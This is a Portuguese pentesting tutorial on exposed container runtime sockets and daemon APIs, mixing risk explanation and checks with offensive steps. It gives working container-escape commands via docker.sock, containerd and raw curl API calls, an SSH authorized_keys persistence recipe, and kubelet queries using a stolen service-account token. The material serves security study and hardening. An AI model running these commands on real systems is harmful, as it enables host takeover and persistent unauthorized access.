# Exposição da API do Runtime e do Daemon

{{#include ../../../banners/hacktricks-training.md}}

## Visão geral

Muitos comprometimentos reais de containers não começam com um namespace escape. Eles começam com acesso ao plano de controle do runtime. Se uma workload consegue se comunicar com `dockerd`, `containerd`, CRI-O, Podman ou kubelet por meio de um socket Unix montado ou de um listener TCP exposto, o atacante pode conseguir solicitar um novo container com privilégios maiores, montar o filesystem do host, ingressar nos namespaces do host ou recuperar informações confidenciais do nó. Nesses casos, a API do runtime é o verdadeiro limite de segurança, e comprometê-la é funcionalmente quase o mesmo que comprometer o host.

Por isso, a exposição do socket do runtime deve ser documentada separadamente das proteções do kernel. Um container com seccomp, capabilities e confinamento MAC comuns ainda pode estar a uma chamada de API de comprometer o host se `/var/run/docker.sock` ou `/run/containerd/containerd.sock` estiver montado dentro dele. O isolamento do kernel do container atual pode estar funcionando exatamente como projetado, enquanto o plano de gerenciamento do runtime permanece totalmente exposto.

## Modelos de acesso ao daemon

O Docker Engine tradicionalmente expõe sua API privilegiada por meio do socket Unix local em `unix:///var/run/docker.sock`. Historicamente, ele também foi exposto remotamente por meio de listeners TCP, como `tcp://0.0.0.0:2375`, ou de um listener protegido por TLS na porta `2376`. Expor o daemon remotamente sem TLS forte e autenticação de cliente transforma efetivamente a API do Docker em uma interface remota de root.

containerd, CRI-O, Podman e kubelet expõem superfícies semelhantes de alto impacto. Os nomes e workflows diferem, mas a lógica não. Se a interface permite que o chamador crie workloads, monte caminhos do host, recupere credenciais ou altere containers em execução, ela é um canal de gerenciamento privilegiado e deve ser tratada como tal.

Uma interface web de gerenciamento de containers pode expor o mesmo limite sem conceder à conta local acesso direto ao socket. Por exemplo, [Portainer issue #493](https://github.com/portainer/portainer/issues/493) documentou uma redefinição não autenticada da senha de administrador em uma versão legada 1.11.1. Trate uma interface acessível localmente apenas como um ponto de partida para análise: confirme a versão instalada e o comportamento da autenticação, o controle real de administrador e se o endpoint gerenciado consegue criar containers com um bind mount gravável do host. [Portainer documents](https://docs.portainer.io/admin/environments/add/docker/socket) que o gerenciamento baseado em socket exige acesso ao socket do Docker; um endpoint rootless ou restrito altera o impacto sobre o host. Não deduza a existência da falha de autenticação ou do acesso root ao host apenas pelo nome de um processo, uma porta ou uma string de versão.

Os caminhos locais comuns que vale a pena verificar são:

```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/var/run/kubelet.sock
/run/buildkit/buildkitd.sock
/run/firecracker-containerd.sock
```

Stacks mais antigos ou especializados também podem expor endpoints como `dockershim.sock`, `frakti.sock` ou `rktlet.sock`. Eles são menos comuns em ambientes modernos, mas, quando encontrados, devem ser tratados com a mesma cautela, pois representam superfícies de controle do runtime, não sockets de aplicações comuns.

## Acesso remoto seguro

Se um daemon precisar ser exposto além do socket local, a conexão deve ser protegida com TLS e, de preferência, com autenticação mútua, para que o daemon verifique o cliente e o cliente verifique o daemon. O antigo hábito de expor o daemon do Docker em HTTP puro por conveniência é um dos erros mais perigosos na administração de containers, pois a superfície da API é poderosa o bastante para criar containers privilegiados diretamente.

O padrão histórico de configuração do Docker era assim:

```bash
DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
sudo service docker restart
```

Em hosts baseados em systemd, a comunicação com o daemon também pode aparecer como `fd://`, o que significa que o processo herda um socket pré-aberto do systemd, em vez de vinculá-lo diretamente. A lição importante não é a sintaxe exata, mas a consequência para a segurança. No momento em que o daemon escuta além de um socket local com permissões estritas, a segurança do transporte e a autenticação do cliente tornam-se obrigatórias, e não apenas medidas opcionais de hardening.

## Abuso

Se houver um runtime socket, confirme qual é, se existe um cliente compatível e se é possível acessar via HTTP ou gRPC brutos:

```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
ss -xl | grep -E 'docker|containerd|crio|podman|kubelet' 2>/dev/null
docker -H unix:///var/run/docker.sock version 2>/dev/null
podman --url unix:///run/podman/podman.sock info 2>/dev/null
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io ps 2>/dev/null
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///run/containerd/containerd.sock ps 2>/dev/null
crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers 2>/dev/null
```

Esses comandos são úteis porque permitem distinguir entre um caminho inexistente, um socket montado mas inacessível e uma API privilegiada ativa. Se o cliente funcionar, a próxima pergunta é se a API pode iniciar um novo container com um bind mount do host ou compartilhamento de namespace do host.

### Quando nenhum cliente está instalado

A ausência de `docker`, `podman` ou outra CLI amigável não significa que o socket seja seguro. O Docker Engine usa HTTP pelo seu socket Unix, e o Podman expõe uma API compatível com Docker e uma API nativa do Libpod por meio de `podman system service`. Isso significa que um ambiente mínimo com apenas `curl` ainda pode ser suficiente para controlar o daemon:

```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock http://localhost/v1.54/images/json
curl --unix-socket /var/run/docker.sock \
  -H 'Content-Type: application/json' \
  -d '{"Image":"ubuntu:24.04","Cmd":["id"],"HostConfig":{"Binds":["/:/host"]}}' \
  -X POST http://localhost/v1.54/containers/create

curl --unix-socket /run/podman/podman.sock http://d/_ping
curl --unix-socket /run/podman/podman.sock http://d/v1.40.0/images/json
```

Para execução de código PHP restrita por `open_basedir`, [as conexões por Unix socket continuam sendo uma rota separada](../../../network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass/#unix-sockets-outside-open_basedir) quando o processo PHP tem permissão do OS para se conectar.

Isso é importante durante o post-exploitation porque, às vezes, os defensores removem os binários de cliente usuais, mas deixam o socket de gerenciamento montado. Em hosts Podman, lembre-se de que o caminho de alto valor é diferente em implantações rootful e rootless: `unix:///run/podman/podman.sock` para instâncias de serviço rootful e `unix://$XDG_RUNTIME_DIR/podman/podman.sock` para as rootless.

### Exemplo completo: do socket Docker ao root do host

Se `docker.sock` estiver acessível, o escape clássico é iniciar um novo container que monta o sistema de arquivos raiz do host e, em seguida, executar `chroot` nele:

```bash
docker -H unix:///var/run/docker.sock images
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
```

Isso permite a execução direta como root no host por meio do daemon do Docker. O impacto não se limita à leitura de arquivos. Depois de entrar no novo container, o atacante pode alterar arquivos do host, coletar credenciais, implantar persistência ou iniciar outras cargas de trabalho privilegiadas.

### Exemplo completo: socket do Docker para namespaces do host

Se o atacante preferir entrar nos namespaces em vez de ter acesso apenas ao sistema de arquivos:

```bash
docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```

Esse caminho chega ao host solicitando ao runtime que crie um novo container com exposição explícita dos namespaces do host, em vez de explorar o container atual.

### Padrão de persistência via Docker Socket

O controle do runtime também pode ser usado para persistência, em vez de uma shell de uso único. O padrão genérico consiste em criar um container auxiliar com um mount do host, gravar material de acesso autorizado ou um hook de inicialização no sistema de arquivos montado do host e, em seguida, validar se o host o utiliza.

Exemplo de estrutura:

```bash
docker -H unix:///var/run/docker.sock run -d --name helper -v /:/host ubuntu:24.04 sleep infinity
docker -H unix:///var/run/docker.sock exec helper sh -c 'mkdir -p /host/root/.ssh && chmod 700 /host/root/.ssh'
docker -H unix:///var/run/docker.sock cp ./id_ed25519.pub helper:/tmp/key.pub
docker -H unix:///var/run/docker.sock exec helper sh -c 'cat /tmp/key.pub >>/host/root/.ssh/authorized_keys'
```

A mesma ideia pode ter como alvo unidades do systemd, fragmentos do cron, arquivos de inicialização de aplicativos ou chaves SSH, dependendo do que o operador quer demonstrar. O importante é que a alteração persistente é feita por meio da autoridade do daemon de runtime sobre o sistema de arquivos do host, e não por meio de privilégios adicionais no contêiner original.

### Pivot com o Raw Docker API Helper

Quando o Docker CLI não está disponível, o mesmo fluxo de helper com montagem do host pode ser executado por HTTP sobre o socket Unix. O fluxo genérico é: confirmar a API, criar um contêiner helper com uma montagem bind do host, iniciá-lo, criar uma instância de exec e iniciar essa instância.

```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock \
  -H 'Content-Type: application/json' \
  -d '{"Image":"ubuntu:24.04","Cmd":["sleep","3600"],"HostConfig":{"Binds":["/:/host:rw"]}}' \
  -X POST http://localhost/v1.54/containers/create?name=helper
curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.54/containers/helper/start
curl --unix-socket /var/run/docker.sock \
  -H 'Content-Type: application/json' \
  -d '{"AttachStdout":true,"AttachStderr":true,"Cmd":["chroot","/host","id"]}' \
  -X POST http://localhost/v1.54/containers/helper/exec
```

A solicitação final `/exec/<id>/start` depende do ID de exec retornado, mas o ponto de segurança independe dos detalhes exatos do JSON: o acesso direto à API de um daemon Docker rootful basta para solicitar uma carga de trabalho auxiliar com privilégios maiores.

### Exemplo completo: socket do containerd

Um socket `containerd` montado costuma ser igualmente perigoso:<sup>[[1]](#references)</sup>

```bash
ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /run/containerd/containerd.sock run --tty --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/sh
```

Se houver um cliente mais parecido com o Docker, `nerdctl` pode ser mais conveniente que `ctr`, pois oferece flags familiares, como `--privileged`, `--pid=host` e `-v`:

```bash
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io run --rm -it \
  --privileged --pid=host -v /:/host docker.io/library/alpine:latest sh
chroot /host /bin/sh
```

O impacto continua sendo o comprometimento do host. Mesmo que as ferramentas específicas do Docker não estejam disponíveis, outra API de runtime ainda pode oferecer o mesmo poder administrativo. Em nós do Kubernetes, `crictl` também pode ser suficiente para reconhecimento e interação com contêineres, pois se comunica diretamente com o endpoint CRI.

### BuildKit Socket

É fácil não dar importância ao `buildkitd`, porque muitas pessoas o consideram "apenas o backend de build", mas o daemon ainda é um plano de controle privilegiado. Um `buildkitd.sock` acessível pode permitir que um atacante execute etapas de build arbitrárias, inspecione os recursos do worker, use contextos locais do ambiente comprometido e solicite entitlements perigosos, como `network.host` ou `security.insecure`, se o daemon estiver configurado para permiti-los.

As primeiras interações úteis são:

```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers
buildctl --addr unix:///run/buildkit/buildkitd.sock du
```

Se o daemon aceitar solicitações de build, teste se há entitlements inseguros disponíveis:

```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock build \
  --frontend dockerfile.v0 \
  --local context=. \
  --local dockerfile=. \
  --allow network.host \
  --allow security.insecure \
  --output type=local,dest=/tmp/buildkit-out
```

O impacto exato depende da configuração do daemon, mas um serviço BuildKit rootful com permissões permissivas não é uma conveniência inofensiva para desenvolvedores. Trate-o como outra superfície administrativa de alto valor, especialmente em runners de CI e nós de build compartilhados.

### API do Kubelet via TCP

O kubelet não é um container runtime, mas ainda faz parte do plano de gerenciamento do nó e costuma estar incluído nas discussões sobre limites de confiança. Se a porta segura `10250` do kubelet estiver acessível a partir da workload, ou se credenciais do nó, kubeconfigs ou permissões de proxy forem expostos, o atacante poderá enumerar Pods, recuperar logs ou executar comandos em containers locais do nó sem jamais passar pelo caminho de admissão do Kubernetes API server.

Comece pela descoberta simples:

```bash
curl -sk https://127.0.0.1:10250/pods
curl -sk https://127.0.0.1:10250/runningpods/
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://127.0.0.1:10250/pods
```

Se o caminho de proxy do kubelet ou do API server autorizar `exec`, um cliente compatível com WebSocket pode transformar isso em execução de código em outros containers no nó. É também por isso que `nodes/proxy` com apenas permissão `get` é mais perigoso do que parece: a solicitação ainda pode alcançar endpoints do kubelet que executam comandos, e essas interações diretas com o kubelet não aparecem nos logs de auditoria normais do Kubernetes.<sup>[[2]](#references)</sup>

## Checks

O objetivo dessas verificações é determinar se o container consegue alcançar algum plano de gerenciamento que deveria ter permanecido fora do limite de confiança.

```bash
mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
ss -lntp 2>/dev/null | grep -E ':2375|:2376'
env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE|BUILDKIT_HOST|XDG_RUNTIME_DIR'
find /run /var/run -maxdepth 3 \( -name 'buildkitd.sock' -o -name 'podman.sock' \) 2>/dev/null
```

O que é interessante aqui:

- Um socket de runtime montado geralmente é um recurso administrativo direto, não apenas uma divulgação de informações.
- Um listener TCP na porta `2375` sem TLS deve ser tratado como uma condição de comprometimento remoto.
- Variáveis de ambiente como `DOCKER_HOST` geralmente revelam que a carga de trabalho foi projetada intencionalmente para se comunicar com o runtime do host.

## Padrões do runtime

| Runtime / plataforma | Estado padrão | Comportamento padrão | Enfraquecimento manual comum |
| --- | --- | --- | --- |
| Docker Engine | Socket Unix local por padrão | `dockerd` escuta no socket local e o daemon geralmente é rootful | montar `/var/run/docker.sock`, expor `tcp://...:2375`, TLS fraco ou ausente em `2376` |
| Podman | CLI sem daemon por padrão | Nenhum daemon privilegiado de longa duração é necessário para o uso local comum; sockets de API ainda podem ser expostos quando `podman system service` está habilitado | expor `podman.sock`, executar o serviço amplamente, uso rootful da API |
| containerd | Socket local privilegiado | API administrativa exposta pelo socket local e geralmente consumida por ferramentas de nível superior | montar `containerd.sock`, amplo acesso a `ctr` ou `nerdctl`, expor namespaces privilegiados |
| CRI-O | Socket local privilegiado | O endpoint CRI destina-se a componentes confiáveis locais ao nó | montar `crio.sock`, expor o endpoint CRI a cargas de trabalho não confiáveis |
| Kubernetes kubelet | API de gerenciamento local ao nó | O kubelet não deve estar amplamente acessível a partir de Pods; dependendo de authn/authz, o acesso pode expor o estado dos pods, credenciais e recursos de execução | montar sockets ou certificados do kubelet, autenticação fraca do kubelet, rede do host com endpoint do kubelet acessível |



## References

- [1] [exploração do socket containerd, parte 1](https://thegreycorner.com/2025/02/12/containerd-socket-exploitation-part-1.html)
- [2] [Riscos de bypass do API Server do Kubernetes](https://kubernetes.io/docs/concepts/security/api-server-bypass-risks/)
{{#include ../../../banners/hacktricks-training.md}}
